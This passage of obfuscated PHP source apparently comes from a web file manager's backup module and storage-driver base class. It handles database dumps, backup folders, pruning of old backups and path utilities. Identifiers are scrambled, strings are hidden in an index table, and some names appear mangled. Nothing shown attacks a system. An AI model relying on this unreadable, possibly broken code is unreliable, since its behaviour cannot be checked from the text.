$¡ØáÊ == 1 ? 1 : 0; } private function initData($ˆ’Ç = 0, $Ô÷ƒ = '') { $öè¶êƒàÈ =& $_SERVER[ÀÆ]; $±®¹ˆÕÚƒÑÆ = Model($öè¶êƒàÈ[734])->config(); if ($Ô÷ƒ && $±®¹ˆÕÚƒÑÆ[$öè¶êƒàÈ[737]] != $Ô÷ƒ) { $ˆ’Ç = 0; } $this->checkStore($±®¹ˆÕÚƒÑÆ[$öè¶êƒàÈ[737]]); if (self::$manual == 1) { self::$name .= $öè¶êƒàÈ[71] . date($öè¶êƒàÈ[739]); } $‘»Àğíğéå¥İ = array($öè¶êƒàÈ[737] => $±®¹ˆÕÚƒÑÆ[$öè¶êƒàÈ[737]], $öè¶êƒàÈ[28] => self::$name, $öè¶êƒàÈ[735] => 0, $öè¶êƒàÈ[740] => $±®¹ˆÕÚƒÑÆ[$öè¶êƒàÈ[740]], $öè¶êƒàÈ[741] => self::$manual, $öè¶êƒàÈ[291] => array($öè¶êƒàÈ[742] => array($öè¶êƒàÈ[735] => 0), $öè¶êƒàÈ[743] => array($öè¶êƒàÈ[735] => 0, $öè¶êƒàÈ[744] => 0, $öè¶êƒàÈ[745] => 0, $öè¶êƒàÈ[29] => $öè¶êƒàÈ[33], $öè¶êƒàÈ[746] => 0, $öè¶êƒàÈ[490] => 0), $öè¶êƒàÈ[747] => array($öè¶êƒàÈ[735] => 0, $öè¶êƒàÈ[744] => 0, $öè¶êƒàÈ[745] => 0, $öè¶êƒàÈ[746] => 0, $öè¶êƒàÈ[490] => 0), $öè¶êƒàÈ[193] => array($öè¶êƒàÈ[735] => 0, $öè¶êƒàÈ[748] => 0, $öè¶êƒàÈ[749] => 0, $öè¶êƒàÈ[750] => 0, $öè¶êƒàÈ[751] => 0, $öè¶êƒàÈ[461] => $ˆ’Ç, $öè¶êƒàÈ[746] => 0, $öè¶êƒàÈ[490] => 0)), $öè¶êƒàÈ[746] => time(), $öè¶êƒàÈ[490] => 0); $µÎÈƒˆœš€§Ò = Model($öè¶êƒàÈ[734])->insert($‘»Àğíğéå¥İ); $‘»Àğíğéå¥İ[$öè¶êƒàÈ[395]] = $µÎÈƒˆœš€§Ò; return $‘»Àğíğéå¥İ; } private function checkStore($Şšş²ÌØµÚ¥·) { $‡¸§”ë§ˆ =& $_SERVER[ÀÆ]; $¼£«ùÈ€öƒè = Model($‡¸§”ë§ˆ[752])->listData($Şšş²ÌØµÚ¥·); Model($‡¸§”ë§ˆ[752])->checkConfig($¼£«ùÈ€öƒè); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ÀÆ][734])->findByName(self::$name); } return self::$option; } public static function set($á) { $ê¾× =& $_SERVER[ÀÆ]; $–‹ÊÂ = self::get(); foreach ($á as $­ë => $İøò•¢) { $åÚĞ‚Ú = explode($ê¾×[95], $­ë); $Ç¤š = count($åÚĞ‚Ú); switch ($Ç¤š) { case 1: $–‹ÊÂ[$åÚĞ‚Ú[0]] = $İøò•¢; break; case 2: $–‹ÊÂ[$åÚĞ‚Ú[0]][$åÚĞ‚Ú[1]] = $İøò•¢; break; case 3: $–‹ÊÂ[$åÚĞ‚Ú[0]][$åÚĞ‚Ú[1]][$åÚĞ‚Ú[2]] = $İøò•¢; break; } } Model($ê¾×[734])->update($–‹ÊÂ[$ê¾×[395]], $–‹ÊÂ); self::$option = $–‹ÊÂ; return self::$option; } public function keep() { $•İÜá¹‹—½ =& $_SERVER[ÀÆ]; $º½“ìã« = self::get(); if ($º½“ìã«[$•İÜá¹‹—½[291]][$•İÜá¹‹—½[742]][$•İÜá¹‹—½[735]] == $•İÜá¹‹—½[87]) { return; } $this->backupKeep($º½“ìã«); self::set(array($•İÜá¹‹—½[753] => 1)); } private function backupKeep($×±»‰) { $†‡ÖÊñ³ =& $_SERVER[ÀÆ]; if (self::$manual == 1) { return; } $Ê— = Model($†‡ÖÊñ³[734])->listData(); if (empty($Ê—)) { return; } $ò®Ëå·†°Œ = 0; $ú÷í™²“ä¥ = array(); foreach ($Ê— as $êÎå«Àà) { if ($ò®Ëå·†°Œ >= 7) { break; } $ú÷í™²“ä¥[] = $êÎå«Àà[$†‡ÖÊñ³[28]]; $ò®Ëå·†°Œ++; } for ($ò®Ëå·†°Œ = 0; $ò®Ëå·†°Œ < 12; $ò®Ëå·†°Œ++) { $ú÷í™²“ä¥[] = date($†‡ÖÊñ³[754], strtotime("\55{$ò®Ëå·†°Œ}\40\x6d\x6f\x6e\x74\150\x73")); } $ú÷í™²“ä¥ = array_unique($ú÷í™²“ä¥); $’ìä­Õ‚ßŞ = Model($†‡ÖÊñ³[755])->get($†‡ÖÊñ³[756]); foreach ($Ê— as $êÎå«Àà) { if (isset($êÎå«Àà[$†‡ÖÊñ³[741]]) && $êÎå«Àà[$†‡ÖÊñ³[741]] == $†‡ÖÊñ³[87]) { continue; } if (!empty($êÎå«Àà[$†‡ÖÊñ³[28]]) && in_array($êÎå«Àà[$†‡ÖÊñ³[28]], $ú÷í™²“ä¥)) { continue; } Model($†‡ÖÊñ³[734])->remove($êÎå«Àà[$†‡ÖÊñ³[395]]); $ôá×• = $this->backupPath($×±»‰, $’ìä­Õ‚ßŞ); IO::remove($ôá×•, !1); } } private function backupPath($­íİÊ, $Ó‹éö = false) { $€×Ò =& $_SERVER[ÀÆ]; if (!$Ó‹éö) { $Ó‹éö = Model($€×Ò[755])->get($€×Ò[756]); } $†üíĞ = $­íİÊ[$€×Ò[28]]; $ğ¸ = substr(md5($€×Ò[757] . $Ó‹éö . $†üíĞ), 0, 8); return "\173\x69\157\x3a{$­íİÊ[$€×Ò[737]]}\x7d\x2f\x64\141\x74\141\x62\x61\x73\145\57\x62\141\x63\153\x75\160\57" . $†üíĞ . $€×Ò[71] . $ğ¸; } public function db() { $êÂé’¦ =& $_SERVER[ÀÆ]; $ÎìÍ = self::get(); if ($ÎìÍ[$êÂé’¦[291]][$êÂé’¦[743]][$êÂé’¦[735]] == $êÂé’¦[87]) { return !0; } $Û¯ğèŞ¨¸» = new BackupDb(); if (!$Û¯ğèŞ¨¸»->index()) { return !1; } self::set(array($êÂé’¦[758] => 1)); return !0; } public function dbFile() { $¯æâ· =& $_SERVER[ÀÆ]; $‹»¹Œß = self::get(); if ($‹»¹Œß[$¯æâ·[291]][$¯æâ·[747]][$¯æâ·[735]] == $¯æâ·[87]) { return !0; } $õ±©“¸™à’ = new BackupDbFile(); if (!$õ±©“¸™à’->index()) { return !1; } self::set(array($¯æâ·[759] => 1)); return !0; } public function file() { $­€ =& $_SERVER[ÀÆ]; $é’Àë†¥Ò¬˜ = self::get(); if ($é’Àë†¥Ò¬˜[$­€[291]][$­€[193]][$­€[735]] == $­€[87]) { return !0; } if (!isset($é’Àë†¥Ò¬˜[$­€[740]]) || $é’Àë†¥Ò¬˜[$­€[740]] == $­€[191]) { $Ù¯âŠ”­¯ = new BackupFile(); if (!$Ù¯âŠ”­¯->index()) { return !1; } } self::set(array($­€[760] => 1, $­€[735] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ıåÏ’ =& $_SERVER[ÀÆ]; $µ•×øòı² = Backup::get(); self::$io = $µ•×øòı²[$ıåÏ’[737]]; self::$name = $µ•×øòı²[$ıåÏ’[28]]; $ôÚ¼áƒ°ô = $GLOBALS[$ıåÏ’[6]][$ıåÏ’[17]]; $´ƒ€››Å“ = $this->_dbType($ôÚ¼áƒ°ô); $‚Áİ = new DbManage($ôÚ¼áƒ°ô, $´ƒ€››Å“); $‹òÎ = array($ıåÏ’[761] => $´ƒ€››Å“, $ıåÏ’[762] => time()); Backup::set($‹òÎ); $”Ìõ»º•ÜŠÔ = $this->tmpFilesPath() . $ıåÏ’[763] . self::$name . $ıåÏ’[8]; del_dir($”Ìõ»º•ÜŠÔ); mk_dir($”Ìõ»º•ÜŠÔ); $™ÊñÆœ = $Æ® = 0; try { $Ö²ì¿òé = $‚Áİ->getTables(); } catch (Exception $®‹›”ß’) { return !1; } $Ö²ì¿òé = array_diff($Ö²ì¿òé, array($ıåÏ’[764], $ıåÏ’[765])); foreach ($Ö²ì¿òé as $“ÚÌÖÛâ) { $™ÊñÆœ += $‚Áİ->model($“ÚÌÖÛâ)->count(); } $£ˆ¥â¯ï“ = new Task($ıåÏ’[766], $ıåÏ’[767], $™ÊñÆœ, LNG($ıåÏ’[768]) . $ıåÏ’[769] . LNG($ıåÏ’[770])); foreach ($Ö²ì¿òé as $“ÚÌÖÛâ) { $¡Ú´ûõÀ¶’à = $”Ìõ»º•ÜŠÔ . $“ÚÌÖÛâ . $ıåÏ’[771]; $í° = null; if ($“ÚÌÖÛâ == $ıåÏ’[772] && (!isset($µ•×øòı²[$ıåÏ’[740]]) || $µ•×øòı²[$ıåÏ’[740]] == $ıåÏ’[191])) { $í° = self::$io; } $Æ® += $‚Áİ->sqlFromDb($“ÚÌÖÛâ, $¡Ú´ûõÀ¶’à, $£ˆ¥â¯ï“, $í°); } if (isset($£ˆ¥â¯ï“->task[$ıåÏ’[773]])) { $§èéİ = $£ˆ¥â¯ï“->task[$ıåÏ’[773]] ? $£ˆ¥â¯ï“->task[$ıåÏ’[773]] : timeFloat(); $ŒşüÃÒ¨âËŸÆ = $§èéİ - $£ˆ¥â¯ï“->task[$ıåÏ’[774]]; if ($ŒşüÃÒ¨âËŸÆ >= 0.2) { $™ÊñÆœ += 1; } } $£ˆ¥â¯ï“->end(); $‹òÎ = array($ıåÏ’[761] => $´ƒ€››Å“, $ıåÏ’[758] => 1, $ıåÏ’[775] => $™ÊñÆœ, $ıåÏ’[776] => $Æ®, $ıåÏ’[777] => time()); Backup::set($‹òÎ); if ($™ÊñÆœ - $Æ® > 1) { $¦‡ = $ıåÏ’[778]; if (stristr(I18n::getType(), $ıåÏ’[779])) { $¦‡ = $ıåÏ’[780]; } write_log(array($¦‡, $‹òÎ), $ıåÏ’[767]); return !1; } return !0; } private function _dbType($Ğ Õ»Ç) { $¼¿ğõ¶†ø—ïß =& $_SERVER[ÀÆ]; $Ğ Õ»Ç = array_change_key_case($Ğ Õ»Ç); $©Èüô€É = $Ğ Õ»Ç[$¼¿ğõ¶†ø—ïß[781]]; if ($©Èüô€É == $¼¿ğõ¶†ø—ïß[782]) { $ÇÑüÈà = explode($¼¿ğõ¶†ø—ïß[4], $Ğ Õ»Ç[$¼¿ğõ¶†ø—ïß[783]]); $©Èüô€É = $ÇÑüÈà[0]; } $ùí·º = array($¼¿ğõ¶†ø—ïß[784] => $¼¿ğõ¶†ø—ïß[9], $¼¿ğõ¶†ø—ïß[785] => $¼¿ğõ¶†ø—ïß[786]); if (isset($ùí·º[$©Èüô€É])) { $©Èüô€É = $ùí·º[$©Èüô€É]; } return $©Èüô€É; } private function tmpFilesPath() { $¡ÓÆ—îŞõ‰ =& $_SERVER[ÀÆ]; $¨ = TEMP_FILES; if ($GLOBALS[$¡ÓÆ—îŞõ‰[6]][$¡ÓÆ—îŞõ‰[88]][$¡ÓÆ—îŞõ‰[787]]) { $¨ = $GLOBALS[$¡ÓÆ—îŞõ‰[6]][$¡ÓÆ—îŞõ‰[88]][$¡ÓÆ—îŞõ‰[787]]; if (!mk_dir($¨) || !is_writable($¨) || !IO::mkfile($¨ . $¡ÓÆ—îŞõ‰[788])) { $¨ = TEMP_FILES; } } return $¨; } } class BackupDbFile { public function __construct() { } public function index() { $Ä·ÌôÂë =& $_SERVER[ÀÆ]; $‹û­š = Backup::get(); $’¹« = $‹û­š[$Ä·ÌôÂë[28]]; $·  = $this->tmpFilesPath() . "\x62\x61\143\x6b\x75\x70\x5f{$’¹«}\57"; $õİ¡æ†Ş¤œ = $this->backupPath($‹û­š); if (!($õİ¡æ†Ş¤œ = IO::mkdir($õİ¡æ†Ş¤œ))) { return !1; } $‹Ú·¢–¾ = IO::listPath($· ); $× = isset($‹Ú·¢–¾[$Ä·ÌôÂë[74]]) ? $‹Ú·¢–¾[$Ä·ÌôÂë[74]] : array(); $’ùˆíõ•ß = array_sum(array_column($×, $Ä·ÌôÂë[78])); if (!$’ùˆíõ•ß) { return !1; } $ÌÇ¾×÷‰‚ìŒ = array($Ä·ÌôÂë[789] => $’ùˆíõ•ß, $Ä·ÌôÂë[790] => time()); Backup::set($ÌÇ¾×÷‰‚ìŒ); $©ÒÉãß˜¢ = new TaskFileTransfer($Ä·ÌôÂë[791], $Ä·ÌôÂë[767], count($×), LNG($Ä·ÌôÂë[768]) . $Ä·ÌôÂë[454] . LNG($Ä·ÌôÂë[770]) . $Ä·ÌôÂë[792]); $©ÒÉãß˜¢->task[$Ä·ÌôÂë[748]] = $’ùˆíõ•ß; foreach ($‹Ú·¢–¾[$Ä·ÌôÂë[74]] as $í³) { $›ÕÀÀŒÆ = IO::move($í³[$Ä·ÌôÂë[76]], $õİ¡æ†Ş¤œ); if (!$›ÕÀÀŒÆ) { $©ÒÉãß˜¢->end(); $á‹‚” óŒ = IO::getLastError($Ä·ÌôÂë[793] . $í³[$Ä·ÌôÂë[76]] . $Ä·ÌôÂë[794] . $õİ¡æ†Ş¤œ . $Ä·ÌôÂë[530]); write_log($á‹‚” óŒ, $Ä·ÌôÂë[767]); return !1; } } $¨®ã = CONTROLLER_DIR . $Ä·ÌôÂë[795]; $€ı†Ñ´ş’Ïëˆ = CONTROLLER_DIR . $Ä·ÌôÂë[796]; IO::copy($¨®ã, $õİ¡æ†Ş¤œ); IO::copy($€ı†Ñ´ş’Ïëˆ, $õİ¡æ†Ş¤œ); $©ÒÉãß˜¢->end(); $ÌÇ¾×÷‰‚ìŒ = array($Ä·ÌôÂë[797] => $’ùˆíõ•ß, $Ä·ÌôÂë[798] => time()); Backup::set($ÌÇ¾×÷‰‚ìŒ); return !0; } private function backupPath($©¾åêİĞ¡è) { $ËÔšºú½­öÈ =& $_SERVER[ÀÆ]; $œò = $©¾åêİĞ¡è[$ËÔšºú½­öÈ[28]]; $–™­È€“¡å‚ = Model($ËÔšºú½­öÈ[755])->get($ËÔšºú½­öÈ[756]); $ëÉ™Ñº«Ô·÷Õ = substr(md5($ËÔšºú½­öÈ[757] . $–™­È€“¡å‚ . $œò), 0, 8); return "\173\151\157\72{$©¾åêİĞ¡è[$ËÔšºú½­öÈ[737]]}\175\x2f\144\x61\164\x61\x62\141\163\145\x2f\x62\x61\x63\153\x75\160\57" . $œò . $ËÔšºú½­öÈ[71] . $ëÉ™Ñº«Ô·÷Õ; } private function tmpFilesPath() { $“™¦ú‘Ñ‡® =& $_SERVER[ÀÆ]; $ÍŠ·ñ = TEMP_FILES; if ($GLOBALS[$“™¦ú‘Ñ‡®[6]][$“™¦ú‘Ñ‡®[88]][$“™¦ú‘Ñ‡®[787]]) { $ÍŠ·ñ = $GLOBALS[$“™¦ú‘Ñ‡®[6]][$“™¦ú‘Ñ‡®[88]][$“™¦ú‘Ñ‡®[787]]; if (!mk_dir($ÍŠ·ñ) || !is_writable($ÍŠ·ñ) || !IO::mkfile($ÍŠ·ñ . $“™¦ú‘Ñ‡®[788])) { $ÍŠ·ñ = TEMP_FILES; } } return $ÍŠ·ñ; } } goto dòÓğ‡¿œ„; F¶ÑÖÉ¶: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $¿º‰½ğÌÜ« =& $_SERVER[ÀÆ]; $this->objectDriver = array($¿º‰½ğÌÜ«[57], $¿º‰½ğÌÜ«[58], $¿º‰½ğÌÜ«[59], $¿º‰½ğÌÜ«[60], $¿º‰½ğÌÜ«[61], $¿º‰½ğÌÜ«[62], $¿º‰½ğÌÜ«[63], $¿º‰½ğÌÜ«[64], $¿º‰½ğÌÜ«[65]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ã•şÆÂ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ã•şÆÂ, $_SERVER[ÀÆ][8]); } return $ã•şÆÂ; } public function iconvApp($®ó£ÉªÔ‹Ù‚) { return $®ó£ÉªÔ‹Ù‚; } public function iconvSystem($é›ÃÕÃ÷°Õ) { return $é›ÃÕÃ÷°Õ; } public function iconvTo($õÓóØºÀ—œ”, $ù, $ÜõÄœ) { $™ =& $_SERVER[ÀÆ]; if (!$õÓóØºÀ—œ” || !function_exists($™[66])) { return $õÓóØºÀ—œ”; } static $ü·÷ıïĞà°ğĞ = array(); $Ù = $ù . $™[67] . $ÜõÄœ . $™[68] . $õÓóØºÀ—œ”; if (isset($ü·÷ıïĞà°ğĞ[$Ù])) { return $ü·÷ıïĞà°ğĞ[$Ù]; } if (function_exists($™[69])) { $åà = @mb_convert_encoding($õÓóØºÀ—œ”, $ÜõÄœ, $ù); } else { $åà = @iconv($ù, $ÜõÄœ, $õÓóØºÀ—œ”); } $åà = $åà ? $åà : $õÓóØºÀ—œ”; if (strstr($åà, $™[70])) { $åà = str_replace($™[70], $™[71], $åà); } $ü·÷ıïĞà°ğĞ[$ù . $™[67] . $ÜõÄœ . $™[68] . $õÓóØºÀ—œ”] = $åà; $ü·÷ıïĞà°ğĞ[$ÜõÄœ . $™[67] . $ù . $™[68] . $õÓóØºÀ—œ”] = $õÓóØºÀ—œ”; $ü·÷ıïĞà°ğĞ[$ÜõÄœ . $™[67] . $ù . $™[68] . $åà] = $õÓóØºÀ—œ”; $ü·÷ıïĞà°ğĞ[$ù . $™[67] . $ÜõÄœ . $™[68] . $åà] = $åà; return $åà; } public function getPathInner($±ÅşÓÑ) { $° = IO::init($±ÅşÓÑ); return $°->path; } public function getPathOuter($çâ­ÚƒÛ„) { $ø‹ß˜ò° =& $_SERVER[ÀÆ]; $é”» = strlen(trim($this->pathBase, $ø‹ß˜ò°[8])); $çâ­ÚƒÛ„ = substr(trim($çâ­ÚƒÛ„, $ø‹ß˜ò°[8]), $é”»); return $this->pathDriver . $ø‹ß˜ò°[8] . ltrim($çâ­ÚƒÛ„, $ø‹ß˜ò°[8]); } public function isParentOf($Õ­Äë•ê», $êâ) { $¯öÛ¦Ëò·ú¸ =& $_SERVER[ÀÆ]; $Õ­Äë•ê» = rtrim(strtolower($Õ­Äë•ê»), $¯öÛ¦Ëò·ú¸[8]) . $¯öÛ¦Ëò·ú¸[8]; $êâ = rtrim(strtolower($êâ), $¯öÛ¦Ëò·ú¸[8]) . $¯öÛ¦Ëò·ú¸[8]; $çáõÀô…ï¶€ = strpos($êâ, $Õ­Äë•ê») === 0; return $çáõÀô…ï¶€; } public function getType() { $×¸ñ“ =& $_SERVER[ÀÆ]; $óÕŞ¾ÓŒª = str_replace($×¸ñ“[72], $×¸ñ“[33], get_class($this)); return strtolower($óÕŞ¾ÓŒª); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ÆÜ”å—“•, $é’ò¼Õ–) { $¡ =& $_SERVER[ÀÆ]; $´ÑÛƒœü‰ = rtrim($ÆÜ”å—“•, $¡[8]) . $¡[8] . $é’ò¼Õ–; $âşÂµÆ = $this->exist($´ÑÛƒœü‰); return $âşÂµÆ ? $´ÑÛƒœü‰ : !1; } public function setModifyTime($ì¸—Š“ŸÕõ , $Ë = '') { } public function renameObject($Ü™ëôõù²‚º›, $Ï”°) { $¶—çšåŠé =& $_SERVER[ÀÆ]; $¬óáÜûı = $Ï”°; Hook::trigger($¶—çšåŠé[73], $this, $Ü™ëôõù²‚º›, $this, $this->pathFather($Ü™ëôõù²‚º›) . $Ï”°); $Ü™ëôõù²‚º› = $this->getPathOuter($Ü™ëôõù²‚º›); $Ï”° = $this->pathFather($Ü™ëôõù²‚º›) . $Ï”°; if (IO::isFile($Ü™ëôõù²‚º›)) { $‘µ¼Ÿ† = IO::copy($Ü™ëôõù²‚º›, $this->pathFather($Ü™ëôõù²‚º›), REPEAT_RENAME_FOLDER, $¬óáÜûı); if ($‘µ¼Ÿ†) { IO::remove($Ü™ëôõù²‚º›); } } else { $‘µ¼Ÿ† = IO::mkdir($Ï”°); if (!$‘µ¼Ÿ†) { return !1; } $´­ = IO::listPath($Ü™ëôõù²‚º›, !0); $§™ßã = array_merge($´­[$¶—çšåŠé[74]], $´­[$¶—çšåŠé[75]]); foreach ($§™ßã as $Ÿ«£ÈùÊ) { IO::move($Ÿ«£ÈùÊ[$¶—çšåŠé[76]], $Ï”°, REPEAT_RENAME_FOLDER); } IO::remove($Ü™ëôõù²‚º›); } return $‘µ¼Ÿ† ? $Ï”° : !1; } public function tempFile($ÏØ¥Í­µ = '', $ß§ı = '') { if (!$ÏØ¥Í­µ) { $ÏØ¥Í­µ = rand_string(15); } $ ËÍˆÁÓÄ = TEMP_FILES . rand_string(15) . $_SERVER[ÀÆ][8]; @mkdir($ ËÍˆÁÓÄ, DEFAULT_PERRMISSIONS, !0); $÷×Ø®è€ = $ ËÍˆÁÓÄ . $ÏØ¥Í­µ; @touch($÷×Ø®è€); if ($ß§ı) { file_put_contents($÷×Ø®è€, $ß§ı); } return $÷×Ø®è€; } public function tempFileRemve($–ÚÄñÁ) { @unlink($–ÚÄñÁ); @rmdir($this->pathFather($–ÚÄñÁ)); } public function mkfile($ã¸ùÕ, $Úğ×àĞé¾–¡ = '', $¢¯ªµì = REPEAT_RENAME) { } public function mkdir($áÛŒò¶, $ÑÍ¯¶¼’–¢ = REPEAT_SKIP) { } public function delFile($¦ï¬ıÌ‰) { } public function delFolder($•æ€´ñìû‰) { } public function copyFile($µÖ¤ï, $ƒƒ‚¨Å) { } public function moveFile($œ, $Ş¾ø) { } public function remove($ÅÛ) { if ($this->isFile($ÅÛ)) { return $this->delFile($ÅÛ); } return $this->delFolder($ÅÛ); } public function rename($Æ ª‰ÒÊ, $ò©õè€’ï¨»ú) { } public function exist($îÍ‘ëÖ) { } public function findByHash($¹¤Ë = '', $ÔÛÃò = '') { return !1; } public function isFile($Œè‰‚º±ñ) { } public function isFolder($â÷Èû»ÄÀ) { } public function size($¾¦Ã¦İˆ) { } public function info($Åá¿) { } public function infoSimple($İ) { return $this->info($İ); } public function infoAuth($¼¿) { return $this->info($¼¿); } public function infoFull($Ü‹) { return $this->info($Ü‹); } public function infoWithChildren($·ü†ºéí») { $› =& $_SERVER[ÀÆ]; static $ÍÛ = array(); if (isset($ÍÛ[$·ü†ºéí»])) { return $ÍÛ[$·ü†ºéí»]; } $İÀşíƒÀ = $this->info($·ü†ºéí»); if ($İÀşíƒÀ && $İÀşíƒÀ[$›[29]] == $›[77]) { $úŒè³ğ = array($›[78] => 0, $›[79] => 0, $›[80] => 0); $this->infoChildren($·ü†ºéí», $úŒè³ğ); $İÀşíƒÀ[$›[78]] = $úŒè³ğ[$›[78]]; $İÀşíƒÀ[$›[81]] = array($›[82] => $úŒè³ğ[$›[79]], $›[83] => $úŒè³ğ[$›[80]]); $ÍÛ[$·ü†ºéí»] = $İÀşíƒÀ; } return $İÀşíƒÀ; } public function listPath($®ºú¥±‘¶ñ, $ßÈª½ = false) { } public function has($‰İ”¬à±İÔœù, $ÇÔ»˜²‚şÑ¦ = false, $£ = false) { } public function canRead($Ñ®) { } public function canWrite($´³ª’ÊÏÇÍÑï) { } public function getContent($ìÜöê°€Ú) { } public function setContent($±±, $Êï = '') { } protected function infoChildren($¥, &$ÌÙº¤ç’Ì‡¶) { $³°ÇæŸŠ– =& $_SERVER[ÀÆ]; check_abort_echo(); $Œ¦–ªÔ×’Ë = $this->listPath($¥, !0); $Œ¦–ªÔ×’Ë = array_merge($Œ¦–ªÔ×’Ë[$³°ÇæŸŠ–[75]], $Œ¦–ªÔ×’Ë[$³°ÇæŸŠ–[74]]); foreach ($Œ¦–ªÔ×’Ë as $êºÓ™¹) { if ($êºÓ™¹[$³°ÇæŸŠ–[29]] == $³°ÇæŸŠ–[77]) { $ÌÙº¤ç’Ì‡¶[$³°ÇæŸŠ–[80]]++; $Óñ“—§ÑÓ = $this->getPathInner($êºÓ™¹[$³°ÇæŸŠ–[76]]); $this->infoChildren($Óñ“—§ÑÓ, $ÌÙº¤ç’Ì‡¶); } else { $ÌÙº¤ç’Ì‡¶[$³°ÇæŸŠ–[79]]++; $ÌÙº¤ç’Ì‡¶[$³°ÇæŸŠ–[78]] += $êºÓ™¹[$³°ÇæŸŠ–[78]]; } } } public function fileSubstr($áÃ¦, $¿ß, $÷) { } public function listAll($ë†¾) { } public function listAllMake($³ÂÏ©Ãìµ‹Â¨, &$×¨) { $ËÌğ =& $_SERVER[ÀÆ]; check_abort_echo(); $Å = $this->listPath($³ÂÏ©Ãìµ‹Â¨, !0); if (!$Å) { return; } $™Éà…²Èô = array_merge($Å[$ËÌğ[75]], $Å[$ËÌğ[74]]); foreach ($™Éà…²Èô as $) { $¡ = $[$ËÌğ[29]] == $ËÌğ[77]; $Ñ¢´ = array($ËÌğ[76] => $[$ËÌğ[76]], $ËÌğ[77] => $¡); if (isset($[$ËÌğ[78]])) { $Ñ¢´[$ËÌğ[78]] = $[$ËÌğ[78]]; } if (isset($[$ËÌğ[84]])) { $Ñ¢´[$ËÌğ[84]] = $[$ËÌğ[84]]; } if (!$¡) { $×¨[] = $Ñ¢´; continue; } $×¨[] = $Ñ¢´; $this->listAllMake($[$ËÌğ[76]], $×¨); } } public function listAllSimple($ ‘··¾à¸¬î˜) { $·šå²–¡³ =& $_SERVER[ÀÆ]; $Ş®¨ = array(); $¤£ÒüÛß®®æç = $this->listAll($ ‘··¾à¸¬î˜); $Œû‚İ…ƒ– = $this->getPathOuter($ ‘··¾à¸¬î˜); foreach ($¤£ÒüÛß®®æç as $ÀÖ¨ƒø) { $òŠƒĞŒÇ = $ÀÖ¨ƒø[$·šå²–¡³[76]]; $‘å…»ï¿Ø€Ú = $ÀÖ¨ƒø[$·šå²–¡³[76]]; if (isset($ÀÖ¨ƒø[$·šå²–¡³[85]])) { $òŠƒĞŒÇ = $ÀÖ¨ƒø[$·šå²–¡³[85]][$·šå²–¡³[76]]; $ÀÖ¨ƒø[$·šå²–¡³[78]] = $ÀÖ¨ƒø[$·šå²–¡³[85]][$·šå²–¡³[78]]; $ÀÖ¨ƒø[$·šå²–¡³[84]] = $ÀÖ¨ƒø[$·šå²–¡³[85]][$·šå²–¡³[84]]; } else { $‘å…»ï¿Ø€Ú = substr($ÀÖ¨ƒø[$·šå²–¡³[76]], strlen(get_path_father($Œû‚İ…ƒ–))); $‘å…»ï¿Ø€Ú = $·šå²–¡³[8] . ltrim($‘å…»ï¿Ø€Ú, $·šå²–¡³[8]); } $µú·´ = array($·šå²–¡³[76] => $‘å…»ï¿Ø€Ú, $·šå²–¡³[77] => $ÀÖ¨ƒø[$·šå²–¡³[77]]); if (isset($ÀÖ¨ƒø[$·šå²–¡³[78]]) && !$ÀÖ¨ƒø[$·šå²–¡³[77]]) { $µú·´[$·šå²–¡³[78]] = $ÀÖ¨ƒø[$·šå²–¡³[78]]; } if (isset($ÀÖ¨ƒø[$·šå²–¡³[84]])) { $µú·´[$·šå²–¡³[84]] = $ÀÖ¨ƒø[$·šå²–¡³[84]]; } if (!$ÀÖ¨ƒø[$·šå²–¡³[77]]) { $µú·´[$·šå²–¡³[86]] = $òŠƒĞŒÇ; } $Ş®¨[] = $µú·´; } return $Ş®¨; } public function upload($ŸÆ°®ûêŸ¦Â, $Âç, $¹‚Üìù¯®ğ = false, $á¼Ô˜ = REPEAT_REPLACE) { } public function uploadFileByID($ñÚ¡Â, $Ê½ş, $´ã®€Ö‹ÌŠ) { } public function uploadFileByPath($¤¥«¬«•œŠ, $Œ…ÌıÎÅÛ˜, $¥§‘ = array()) { } public function isUploadServer() { $²éıÎ ÉŸ‡ =& $_SERVER[ÀÆ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $²éıÎ ÉŸ‡[87]) { return !0; } return $GLOBALS[$²éıÎ ÉŸ‡[6]][$²éıÎ ÉŸ‡[88]][$²éıÎ ÉŸ‡[89]]; } public function isFileOutServer() { $äÁ =& $_SERVER[ÀÆ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $äÁ[87]) { return !0; } return $GLOBALS[$äÁ[6]][$äÁ[88]][$äÁ[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Ãî) { $‡§áúŞ =& $_SERVER[ÀÆ]; if (!$this->isCdnHost()) { return $Ãî; } return str_replace(trim(get_url_root($Ãî), $‡§áúŞ[8]), trim($this->cdnHost, $‡§áúŞ[8]), $Ãî); } public function uploadLink($Ìš¸™¾Ş, $Ç³¡™ = 0) { $’ÙÔº‡ =& $_SERVER[ÀÆ]; if ($this->isUploadServer()) { return; } $Öù„­“ô÷ = $this->getType(); if (!in_array($Öù„­“ô÷, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÙÃùéÓ§ñ = 1024 * 1024 * 10; $æè„Ù¦ = $Ç³¡™ <= $ÙÃùéÓ§ñ ? $’ÙÔº‡[91] : $’ÙÔº‡[92]; $¾İıñ…Ë = (!$Ç³¡™ ? 1 : ceil($Ç³¡™ / pow(1024, 3))) * 3600 * 4; $ü¡¥ğ‹†î˜ú = $this->{$æè„Ù¦}($Ìš¸™¾Ş, $¾İıñ…Ë); if ($ü¡¥ğ‹†î˜ú) { $ü¡¥ğ‹†î˜ú[$’ÙÔº‡[93]] = $Ìš¸™¾Ş; $ü¡¥ğ‹†î˜ú[$’ÙÔº‡[94]] = $Öù„­“ô÷; } return $ü¡¥ğ‹†î˜ú; } public function uploadFormData($ş¦±äÊ™¶‹ˆœ, $ó = 3600) { } public function multiUploadFormData($, $ú = 3600) { } public function download($öÍ÷»¸‘ãéÉ, $Â÷»Â ) { } public function ext($İê) { $Š›Ğ†‘œİû =& $_SERVER[ÀÆ]; if (strpos($İê, $Š›Ğ†‘œİû[8]) === -1) { $²í‰à” = $İê; } else { $²í‰à” = 